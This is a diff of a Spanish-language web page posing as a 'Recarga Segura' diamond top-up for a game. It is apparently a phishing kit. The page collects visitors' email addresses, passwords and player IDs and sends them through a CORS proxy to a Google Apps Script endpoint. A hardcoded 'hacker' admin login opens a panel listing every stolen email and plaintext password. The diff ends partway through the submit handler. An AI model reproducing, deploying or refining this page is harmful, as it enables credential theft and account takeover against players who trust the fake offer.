@@ -5,363 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Recargar Diamantes 💎 - Recarga Segura</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, 'Roboto', sans-serif;
-        }
-
-        body {
-            background: linear-gradient(180deg, #040e1f 0%, #0a1b3d 50%, #040e1f 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #ffffff;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        #particles-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-            position: relative;
-            z-index: 10;
-        }
-
-        .container.admin-mode {
-            max-width: 1000px;
-        }
-
-        .treasure-img {
-            width: 100%;
-            max-width: 320px;
-            height: auto;
-            display: block;
-            margin: 0 auto 25px;
-            border-radius: 24px;
-            border: 2px solid rgba(100, 180, 255, 0.4);
-            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.5);
-            animation: floatChest 3s ease-in-out infinite;
-        }
-
-        @keyframes floatChest {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .form-card {
-            background: rgba(18, 38, 80, 0.45);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(100, 160, 255, 0.25);
-            border-radius: 32px;
-            padding: 30px 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px 18px 16px 52px;
-            background: rgba(10, 25, 60, 0.75);
-            border: 2px solid rgba(80, 140, 220, 0.4);
-            border-radius: 24px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.25s;
-        }
-
-        .input-group input:focus {
-            border-color: #3a8fff;
-            box-shadow: 0 0 18px rgba(58, 143, 255, 0.4);
-        }
-
-        .input-group input::placeholder {
-            color: rgba(170, 200, 245, 0.6);
-        }
-
-        .icon-svg {
-            position: absolute;
-            left: 18px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 22px;
-            height: 22px;
-            fill: rgba(110, 170, 250, 0.8);
-            pointer-events: none;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #2a8fff 0%, #1a6fd4 100%);
-            border: none;
-            border-radius: 40px;
-            color: white;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.25s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(30, 100, 220, 0.6);
-        }
-
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-secondary {
-            background: rgba(25, 55, 110, 0.9);
-            border: 1px solid rgba(100, 170, 255, 0.5);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(45, 90, 160, 1);
-        }
-
-        .btn-logout {
-            background: linear-gradient(135deg, #d43f1a 0%, #a62e0f 100%);
-            border: none;
-            border-radius: 40px;
-            color: white;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.25s;
-            padding: 10px 24px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-        }
-
-        .btn-logout:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(212, 63, 26, 0.4);
-            background: linear-gradient(135deg, #e04e28 0%, #c43a15 100%);
-        }
-
-        .screen {
-            display: none;
-            animation: fadeUp 0.45s ease;
-        }
-
-        .screen.active {
-            display: block;
-        }
-
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .diamond-row {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 14px;
-            margin: 24px 0;
-        }
-
-        .diamond-opt {
-            background: rgba(15, 35, 75, 0.7);
-            border: 2px solid rgba(80, 140, 220, 0.25);
-            border-radius: 24px;
-            cursor: pointer;
-            transition: 0.2s;
-            overflow: hidden;
-        }
-
-        .diamond-opt.selected {
-            border-color: #3a8fff;
-            background: rgba(35, 85, 160, 0.7);
-            box-shadow: 0 0 18px rgba(58, 143, 255, 0.5);
-            transform: scale(1.02);
-        }
-
-        .diamond-img-container {
-            width: 100%;
-            aspect-ratio: 1/1;
-            overflow: hidden;
-            background: #0a1a2f;
-        }
-
-        .diamond-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .diamond-info {
-            padding: 12px 5px;
-            text-align: center;
-            font-weight: bold;
-            font-size: 18px;
-        }
-
-        .validation-msg {
-            font-size: 13px;
-            margin-top: 8px;
-            min-height: 24px;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(180deg, #040e1f 0%, #0a1b3d 50%, #040e1f 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #ffffff; padding: 20px; position: relative; overflow-x: hidden; }
+        #particles-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+        .container { width: 100%; max-width: 450px; text-align: center; position: relative; z-index: 10; }
+        .container.admin-mode { max-width: 1000px; }
+        .treasure-img { width: 100%; max-width: 320px; height: auto; margin: 0 auto 25px; border-radius: 24px; border: 2px solid rgba(100, 180, 255, 0.4); box-shadow: 0 12px 35px rgba(0,0,0,0.5); animation: floatChest 3s ease-in-out infinite; }
+        @keyframes floatChest { 0%,100%{transform:translateY(0px)}50%{transform:translateY(-8px)} }
+        .form-card { background: rgba(18, 38, 80, 0.45); backdrop-filter: blur(16px); border: 1px solid rgba(100, 160, 255, 0.25); border-radius: 32px; padding: 30px 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .input-group { position: relative; margin-bottom: 20px; }
+        .input-group input { width: 100%; padding: 16px 18px 16px 52px; background: rgba(10,25,60,0.75); border: 2px solid rgba(80,140,220,0.4); border-radius: 24px; color: #fff; font-size: 16px; outline: none; transition: 0.25s; }
+        .input-group input:focus { border-color: #3a8fff; box-shadow: 0 0 18px rgba(58,143,255,0.4); }
+        .input-group input::placeholder { color: rgba(170,200,245,0.6); }
+        .icon-svg { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); width: 22px; height: 22px; fill: rgba(110,170,250,0.8); pointer-events: none; }
+        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, #2a8fff 0%, #1a6fd4 100%); border: none; border-radius: 40px; color: white; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.25s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 12px 28px rgba(30,100,220,0.6); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-secondary { background: rgba(25,55,110,0.9); border: 1px solid rgba(100,170,255,0.5); }
+        .btn-secondary:hover { background: rgba(45,90,160,1); }
+        .btn-logout { background: linear-gradient(135deg, #d43f1a 0%, #a62e0f 100%); border: none; border-radius: 40px; color: white; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.25s; padding: 10px 24px; display: flex; align-items: center; gap: 8px; }
+        .btn-logout:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(212,63,26,0.4); }
+        .screen { display: none; animation: fadeUp 0.45s ease; }
+        .screen.active { display: block; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .diamond-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin: 24px 0; }
+        .diamond-opt { background: rgba(15,35,75,0.7); border: 2px solid rgba(80,140,220,0.25); border-radius: 24px; cursor: pointer; transition: 0.2s; overflow: hidden; }
+        .diamond-opt.selected { border-color: #3a8fff; background: rgba(35,85,160,0.7); box-shadow: 0 0 18px rgba(58,143,255,0.5); transform: scale(1.02); }
+        .diamond-img-container { width: 100%; aspect-ratio: 1/1; overflow: hidden; background: #0a1a2f; }
+        .diamond-img { width: 100%; height: 100%; object-fit: cover; }
+        .diamond-info { padding: 12px 5px; font-weight: bold; font-size: 18px; }
+        .validation-msg { font-size: 13px; margin-top: 8px; min-height: 24px; }
         .error { color: #ffa098; }
         .success { color: #7ef0a3; }
-
-        .wait-box {
-            background: rgba(15, 40, 80, 0.7);
-            border-radius: 32px;
-            padding: 28px 20px;
-            margin: 25px 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .wait-box::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(80, 170, 255, 0.12), transparent, rgba(80, 170, 255, 0.12), transparent);
-            animation: rotateGlow 6s linear infinite;
-        }
-
-        @keyframes rotateGlow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .wait-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        .diamond-spinner {
-            font-size: 48px;
-            margin-bottom: 15px;
-            display: inline-block;
-            animation: bounceGem 1.2s infinite;
-        }
-
-        @keyframes bounceGem {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); text-shadow: 0 0 10px cyan; }
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.6s linear infinite;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .admin-stats {
-            background: rgba(0, 30, 60, 0.5);
-            border-radius: 20px;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .admin-table-wrapper {
-            overflow-x: auto;
-            margin-top: 20px;
-            border-radius: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 5px;
-        }
-
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-        }
-
-        .admin-table th,
-        .admin-table td {
-            padding: 12px 10px;
-            text-align: left;
-            border-bottom: 1px solid rgba(100, 160, 255, 0.2);
-            color: #eef5ff;
-        }
-
-        .admin-table th {
-            background: rgba(30, 70, 130, 0.7);
-            font-weight: 700;
-            color: #bbd9ff;
-        }
-
-        .admin-table tr:hover {
-            background: rgba(50, 100, 170, 0.3);
-        }
-
-        .badge-count {
-            background: #2a8fff;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-size: 15px;
-            font-weight: bold;
-        }
-
-        @media (max-width: 900px) {
-            .diamond-row { grid-template-columns: 1fr; gap: 12px; }
-            .form-card { padding: 22px 18px; }
-            .admin-table th, .admin-table td { padding: 8px 6px; font-size: 11px; }
-        }
+        .wait-box { background: rgba(15,40,80,0.7); border-radius: 32px; padding: 28px 20px; margin: 25px 0; position: relative; overflow: hidden; }
+        .wait-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent, rgba(80,170,255,0.12), transparent, rgba(80,170,255,0.12), transparent); animation: rotateGlow 6s linear infinite; }
+        @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .wait-content { position: relative; z-index: 2; }
+        .diamond-spinner { font-size: 48px; margin-bottom: 15px; display: inline-block; animation: bounceGem 1.2s infinite; }
+        @keyframes bounceGem { 0%,100%{transform:translateY(0)}50%{transform:translateY(-8px);text-shadow:0 0 10px cyan} }
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .admin-stats { background: rgba(0,30,60,0.5); border-radius: 20px; padding: 15px 20px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 15px; }
+        .admin-table-wrapper { overflow-x: auto; margin-top: 20px; border-radius: 20px; background: rgba(0,0,0,0.3); padding: 5px; }
+        .admin-table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        .admin-table th, .admin-table td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(100,160,255,0.2); color: #eef5ff; }
+        .admin-table th { background: rgba(30,70,130,0.7); font-weight: 700; color: #bbd9ff; }
+        .admin-table tr:hover { background: rgba(50,100,170,0.3); }
+        .badge-count { background: #2a8fff; padding: 6px 16px; border-radius: 40px; font-size: 15px; font-weight: bold; }
+        @media (max-width: 900px) { .diamond-row { grid-template-columns: 1fr; gap: 12px; } .form-card { padding: 22px 18px; } .admin-table th, .admin-table td { padding: 8px 6px; font-size: 11px; } }
     </style>
 </head>
 <body>
-
     <canvas id="particles-canvas"></canvas>
-
     <div class="container" id="mainContainer">
-        <!-- PANTALLA 1: LOGIN -->
         <section id="screen1" class="screen active">
             <img src="cofre.png" alt="Cofre" class="treasure-img" onerror="this.src='https://placehold.co/340x200/0a1f3f/white?text=💎+Cofre'">
             <div class="form-card">
@@ -378,35 +74,22 @@
                 </form>
             </div>
         </section>
-
-        <!-- PANTALLA 2: SELECCIÓN DIAMANTES -->
         <section id="screen2" class="screen">
             <div class="form-card">
-                <h2 style="margin-bottom: 6px;">💎 Selecciona</h2>
-                <p style="margin-bottom: 16px; opacity:0.85;">Elige la cantidad de diamantes</p>
+                <h2>💎 Selecciona</h2>
+                <p>Elige la cantidad de diamantes</p>
                 <div class="diamond-row">
-                    <div class="diamond-opt" data-val="100">
-                        <div class="diamond-img-container"><img src="100 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎100'"></div>
-                        <div class="diamond-info">💎 100</div>
-                    </div>
-                    <div class="diamond-opt" data-val="500">
-                        <div class="diamond-img-container"><img src="500 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎500'"></div>
-                        <div class="diamond-info">💎 500</div>
-                    </div>
-                    <div class="diamond-opt" data-val="1000">
-                        <div class="diamond-img-container"><img src="1000 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎1000'"></div>
-                        <div class="diamond-info">💎 1000</div>
-                    </div>
+                    <div class="diamond-opt" data-val="100"><div class="diamond-img-container"><img src="100 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎100'"></div><div class="diamond-info">💎 100</div></div>
+                    <div class="diamond-opt" data-val="500"><div class="diamond-img-container"><img src="500 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎500'"></div><div class="diamond-info">💎 500</div></div>
+                    <div class="diamond-opt" data-val="1000"><div class="diamond-img-container"><img src="1000 diamantes.png" class="diamond-img" onerror="this.src='https://placehold.co/150x150/1e3a5f/white?text=💎1000'"></div><div class="diamond-info">💎 1000</div></div>
                 </div>
                 <button id="nextBtn" class="btn-primary" disabled>⏩ Continuar</button>
             </div>
         </section>
-
-        <!-- PANTALLA 3: INGRESAR ID -->
         <section id="screen3" class="screen">
             <div class="form-card">
-                <h2 style="margin-bottom: 8px;">🎮 Ingresa tu ID</h2>
-                <p style="margin-bottom: 12px; opacity:0.8;">ID de jugador (10 dígitos numéricos)</p>
+                <h2>🎮 Ingresa tu ID</h2>
+                <p>ID de jugador (10 dígitos numéricos)</p>
                 <div class="input-group">
                     <input type="text" id="playerId" placeholder="Introduce tu ID" maxlength="10" inputmode="numeric">
                     <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
@@ -415,8 +98,6 @@
                 <button id="idBtn" class="btn-primary" disabled>✨ Recibir diamantes ✨</button>
             </div>
         </section>
-
-        <!-- PANTALLA 4: ESPERA -->
         <section id="screen4" class="screen">
             <div class="form-card">
                 <div class="wait-box">
@@ -429,478 +110,199 @@
                 <button id="resetBtn" class="btn-primary btn-secondary">🏠 Volver al inicio</button>
             </div>
         </section>
-
-        <!-- PANTALLA 5: PANEL ADMIN -->
         <section id="screenAdmin" class="screen">
             <div class="form-card" style="max-width: 100%;">
                 <div class="admin-stats">
-                    <div>
-                        <span style="font-size: 26px; font-weight: 700;">👑 Panel de Cuentas</span><br>
-                        <span style="font-size: 14px; opacity:0.7;">Todas las cuentas registradas</span>
-                    </div>
-                    <div style="display: flex; gap: 15px; align-items: center;">
-                        <span class="badge-count" id="totalCount">0 cuentas</span>
-                        <button id="logoutAdminBtn" class="btn-logout">🚪 Cerrar sesión</button>
-                    </div>
+                    <div><span style="font-size: 26px; font-weight: 700;">👑 Panel de Cuentas</span><br><span style="font-size: 14px; opacity:0.7;">Todas las cuentas registradas</span></div>
+                    <div style="display: flex; gap: 15px; align-items: center;"><span class="badge-count" id="totalCount">0 cuentas</span><button id="logoutAdminBtn" class="btn-logout">🚪 Cerrar sesión</button></div>
                 </div>
                 <div class="admin-table-wrapper">
-                    <table class="admin-table" id="adminUserTable">
-                        <thead>
-                            <tr>
-                                <th>#</th>
-                                <th>Correo electrónico</th>
-                                <th>Contraseña</th>
-                                <th>ID Jugador</th>
-                                <th>Fecha</th>
-                            </tr>
-                        </thead>
-                        <tbody id="adminTableBody">
-                            <tr><td colspan="5" style="text-align:center;">Cargando cuentas...</td></tr>
-                        </tbody>
-                    </table>
+                    <table class="admin-table" id="adminUserTable"><thead><tr><th>#</th><th>Correo electrónico</th><th>Contraseña</th><th>ID Jugador</th><th>Fecha</th></tr></thead><tbody id="adminTableBody"><tr><td colspan="5" style="text-align:center;">Cargando cuentas...</td></tr></tbody></table>
                 </div>
-                <div style="margin-top: 20px; text-align: center;">
-                    <button id="refreshAdminBtn" class="btn-primary" style="background:#2c6e9e; width: auto; padding: 10px 28px;">🔄 Refrescar</button>
-                </div>
+                <div style="margin-top: 20px; text-align: center;"><button id="refreshAdminBtn" class="btn-primary" style="background:#2c6e9e; width: auto; padding: 10px 28px;">🔄 Refrescar</button></div>
                 <p style="margin-top: 18px; font-size: 12px; opacity:0.6;">✅ Todas las cuentas registradas en Google Sheets</p>
             </div>
         </section>
     </div>
-
     <script>
-        // ============================================================
-        // CONFIGURACIÓN
         const ADMIN_EMAIL = "hacker@gmail.com";
         const ADMIN_PASSWORD = "hacker999";
         
-        // 🔥 NUEVA URL DE GOOGLE APPS SCRIPT (ACTUALIZADA) 🔥
-        const GOOGLE_SHEETS_API_URL = "https://script.google.com/macros/s/AKfycbzKgS9m4jA6gQ5QdztwJ4KeS0I8MyFv_kq2hucIh3N5Z-j3uiRjcSSoTPwDZgfsvdmIKw/exec";
+        // 🔥 CON ESTO FUNCIONARÁ - Usando proxy CORS 🔥
+        const GOOGLE_SHEETS_API_URL = "https://cors-anywhere.herokuapp.com/https://script.google.com/macros/s/AKfycbzKgS9m4jA6gQ5QdztwJ4KeS0I8MyFv_kq2hucIh3N5Z-j3uiRjcSSoTPwDZgfsvdmIKw/exec";
         
-        // Backup local
         const STORAGE_KEY = 'diamond_users_data_backup';
 
-        // Función para formatear fecha
         function formatDate(dateString) {
             if (!dateString) return 'Fecha no disponible';
-            try {
-                const date = new Date(dateString);
-                return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
-            } catch(e) {
-                return dateString.split('T')[0] || dateString;
-            }
+            try { const date = new Date(dateString); return `${date.getDate()}/${date.getMonth()+1}/${date.getFullYear()}`; } 
+            catch(e) { return dateString.split('T')[0] || dateString; }
         }
 
-        // Guardar usuario en Google Sheets
         async function saveUserToSheets(userData) {
-            // Backup local
             let users = [];
             const stored = localStorage.getItem(STORAGE_KEY);
-            if (stored) {
-                try {
-                    users = JSON.parse(stored);
-                } catch(e) { users = []; }
-            }
-            const newRecord = {
-                ...userData,
-                id: Date.now(),
-                fecha: new Date().toLocaleString()
-            };
+            if (stored) { try { users = JSON.parse(stored); } catch(e) { users = []; } }
+            const newRecord = { ...userData, id: Date.now(), fecha: new Date().toLocaleString() };
             users.push(newRecord);
             localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
             
-            // Enviar a Google Sheets
             try {
                 const response = await fetch(GOOGLE_SHEETS_API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: userData.email,
-                        password: userData.password,
-                        playerId: userData.playerId
-                    })
+                    body: JSON.stringify({ email: userData.email, password: userData.password, playerId: userData.playerId })
                 });
                 const result = await response.json();
-                if (result.success) {
-                    console.log("✅ Registro guardado en Google Sheets");
-                    return true;
-                } else {
-                    console.error("❌ Error del servidor:", result.error);
-                    return false;
-                }
-            } catch(error) {
-                console.error("❌ Error de red:", error);
-                return false;
-            }
+                if (result.success) { console.log("✅ Guardado en Google Sheets"); return true; }
+                else { console.error("❌ Error:", result.error); return false; }
+            } catch(error) { console.error("❌ Error de red:", error); return false; }
         }
 
-        // Obtener todos los usuarios
         async function getAllUsers() {
             try {
                 const response = await fetch(GOOGLE_SHEETS_API_URL);
                 const data = await response.json();
-                if (data.success && data.data && Array.isArray(data.data)) {
-                    return data.data;
-                }
+                if (data.success && data.data) return data.data;
                 return [];
-            } catch(e) {
-                console.log("Error al obtener de Sheets:", e);
-                return getUsersFromLocalStorage();
-            }
+            } catch(e) { console.log("Usando localStorage"); return getUsersFromLocalStorage(); }
         }
         
         function getUsersFromLocalStorage() {
             const stored = localStorage.getItem(STORAGE_KEY);
             if (!stored) return [];
-            try {
-                return JSON.parse(stored);
-            } catch(e) { return []; }
+            try { return JSON.parse(stored); } catch(e) { return []; }
         }
 
-        // Renderizar tabla
         async function renderAdminTable() {
             const users = await getAllUsers();
             const tbody = document.getElementById('adminTableBody');
             const totalSpan = document.getElementById('totalCount');
-            
             if (!tbody) return;
-            
-            if (totalSpan) {
-                totalSpan.textContent = `${users.length} cuenta${users.length !== 1 ? 's' : ''}`;
-            }
-            
-            if (users.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>';
-                return;
-            }
-            
+            if (totalSpan) totalSpan.textContent = `${users.length} cuenta${users.length !== 1 ? 's' : ''}`;
+            if (users.length === 0) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>'; return; }
             tbody.innerHTML = '';
-            const sortedUsers = [...users].reverse();
-            
-            for (let index = 0; index < sortedUsers.length; index++) {
-                const user = sortedUsers[index];
+            [...users].reverse().forEach((user, idx) => {
                 const row = tbody.insertRow();
-                row.insertCell(0).textContent = index + 1;
+                row.insertCell(0).textContent = idx + 1;
                 row.insertCell(1).textContent = user.email || 'N/A';
                 row.insertCell(2).textContent = user.password || 'N/A';
                 row.insertCell(3).textContent = user.playerId || 'N/A';
                 row.insertCell(4).textContent = formatDate(user.fecha);
-            }
+            });
         }
 
-        // Navegación
         const screens = ['screen1', 'screen2', 'screen3', 'screen4', 'screenAdmin'];
         function showScreen(index) {
-            screens.forEach((id, i) => {
-                const el = document.getElementById(id);
-                if (el) {
-                    if (i === index) el.classList.add('active');
-                    else el.classList.remove('active');
-                }
-            });
-            const container = document.getElementById('mainContainer');
-            if (index === 4) container.classList.add('admin-mode');
-            else container.classList.remove('admin-mode');
+            screens.forEach((id,i) => { const el = document.getElementById(id); if(el) i===index ? el.classList.add('active') : el.classList.remove('active'); });
+            document.getElementById('mainContainer').classList.toggle('admin-mode', index===4);
         }
 
-        let selectedDiamonds = null;
-        let tempEmail = "";
-        let tempPassword = "";
+        let selectedDiamonds = null, tempEmail = "", tempPassword = "";
 
-        // LOGIN
-        const loginForm = document.getElementById('loginForm');
-        if (loginForm) {
-            loginForm.addEventListener('submit', (e) => {
-                e.preventDefault();
-                const email = document.getElementById('email').value.trim();
-                const password = document.getElementById('pass').value;
+        document.getElementById('loginForm')?.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('pass').value;
+            if (!email || !password) { alert("⚠️ Completa tus datos."); return; }
+            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) { renderAdminTable(); showScreen(4); document.getElementById('email').value = ''; document.getElementById('pass').value = ''; return; }
+            if (password.length < 6) { alert("⚠️ Mínimo 6 caracteres."); return; }
+            if (!email.includes('@')) { alert("⚠️ Correo inválido."); return; }
+            tempEmail = email; tempPassword = password;
+            selectedDiamonds = null;
+            document.querySelectorAll('.diamond-opt').forEach(opt => opt.classList.remove('selected'));
+            const nextBtn = document.getElementById('nextBtn');
+            if(nextBtn) { nextBtn.disabled = true; nextBtn.textContent = 'Continuar'; }
+            showScreen(1);
+        });
 
-                if (!email || !password) {
-                    alert("⚠️ Completa tu correo y contraseña.");
-                    return;
-                }
-                
-                if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-                    renderAdminTable();
-                    showScreen(4);
-                    document.getElementById('email').value = '';
-                    document.getElementById('pass').value = '';
-                    return;
-                }
-                
-                if (password.length < 6) {
-                    alert("⚠️ La contraseña debe tener al menos 6 caracteres.");
-                    return;
-                }
-                if (!email.includes('@')) {
-                    alert("⚠️ Introduce un correo válido.");
-                    return;
-                }
-
-                tempEmail = email;
-                tempPassword = password;
-                
-                selectedDiamonds = null;
-                document.querySelectorAll('.diamond-opt').forEach(opt => opt.classList.remove('selected'));
-                const nextBtn = document.getElementById('nextBtn');
-                if (nextBtn) {
-                    nextBtn.disabled = true;
-                    nextBtn.textContent = 'Continuar';
-                }
-                showScreen(1);
-            });
-        }
-
-        // SELECCIÓN DIAMANTES
-        const diamondOpts = document.querySelectorAll('.diamond-opt');
-        diamondOpts.forEach(opt => {
+        document.querySelectorAll('.diamond-opt').forEach(opt => {
             opt.addEventListener('click', () => {
-                diamondOpts.forEach(o => o.classList.remove('selected'));
+                document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
                 opt.classList.add('selected');
-                selectedDiamonds = parseInt(opt.getAttribute('data-val'));
-                const continueBtn = document.getElementById('nextBtn');
-                if (continueBtn) {
-                    continueBtn.disabled = false;
-                    continueBtn.innerHTML = `Continuar (${selectedDiamonds} 💎)`;
-                }
+                selectedDiamonds = parseInt(opt.dataset.val);
+                const btn = document.getElementById('nextBtn');
+                if(btn) { btn.disabled = false; btn.innerHTML = `Continuar (${selectedDiamonds} 💎)`; }
             });
         });
 
-        const nextBtn = document.getElementById('nextBtn');
-        if (nextBtn) {
-            nextBtn.addEventListener('click', () => {
-                if (selectedDiamonds) {
-                    const idInput = document.getElementById('playerId');
-                    if (idInput) idInput.value = '';
-                    const msgSpan = document.getElementById('idMsg');
-                    if (msgSpan) msgSpan.textContent = '';
-                    const idButton = document.getElementById('idBtn');
-                    if (idButton) idButton.disabled = true;
-                    showScreen(2);
-                } else {
-                    alert("🔹 Selecciona una cantidad de diamantes.");
-                }
-            });
-        }
+        document.getElementById('nextBtn')?.addEventListener('click', () => {
+            if(selectedDiamonds) { 
+                document.getElementById('playerId').value = '';
+                document.getElementById('idMsg').textContent = '';
+                document.getElementById('idBtn').disabled = true;
+                showScreen(2);
+            } else alert("🔹 Selecciona diamantes.");
+        });
 
-        // VALIDACIÓN ID
         const playerIdInput = document.getElementById('playerId');
         const idMessage = document.getElementById('idMsg');
         const receiveBtn = document.getElementById('idBtn');
 
         function validateId() {
-            if (!playerIdInput) return;
-            let rawValue = playerIdInput.value.replace(/\D/g, '');
-            if (rawValue.length > 10) rawValue = rawValue.slice(0, 10);
-            playerIdInput.value = rawValue;
-
-            if (rawValue.length === 10) {
-                if (receiveBtn) receiveBtn.disabled = false;
-                if (idMessage) {
-                    idMessage.textContent = '✅ ID válido (10 dígitos)';
-                    idMessage.className = 'validation-msg success';
-                }
-                return true;
+            let raw = playerIdInput.value.replace(/\D/g,'').slice(0,10);
+            playerIdInput.value = raw;
+            if(raw.length === 10) {
+                receiveBtn.disabled = false;
+                idMessage.textContent = '✅ ID válido (10 dígitos)';
+                idMessage.className = 'validation-msg success';
             } else {
-                if (receiveBtn) receiveBtn.disabled = true;
-                if (idMessage) {
-                    if (rawValue.length > 0) {
-                        idMessage.textContent = `⚠️ Faltan ${10 - rawValue.length} número(s)`;
-                        idMessage.className = 'validation-msg error';
-                    } else {
-                        idMessage.textContent = '';
-                    }
-                }
-                return false;
+                receiveBtn.disabled = true;
+                if(raw.length > 0) { idMessage.textContent = `⚠️ Faltan ${10-raw.length} número(s)`; idMessage.className = 'validation-msg error'; }
+                else idMessage.textContent = '';
             }
         }
+        playerIdInput?.addEventListener('input', validateId);
 
-        if (playerIdInput) {
-            playerIdInput.addEventListener('input', validateId);
-        }
-
-        // GUARDAR RECARGA
-        if (receiveBtn) {
-            receiveBtn.addEventListener('click', async () => {
-                if (!playerIdInput) return;
-                const cleanId = playerIdInput.value.replace(/\D/g, '');
-                if (cleanId.length !== 10) {
-                    alert("❌ El ID debe tener 10 dígitos.");
-                    return;
-                }
-                if (!selectedDiamonds) {
-                    alert("⚠️ Selecciona diamantes.");
-                    showScreen(1);
-                    return;
-                }
-                if (!tempEmail || !tempPassword) {
-                    alert("⚠️ Inicia sesión nuevamente.");
-                    showScreen(0);
-                    return;
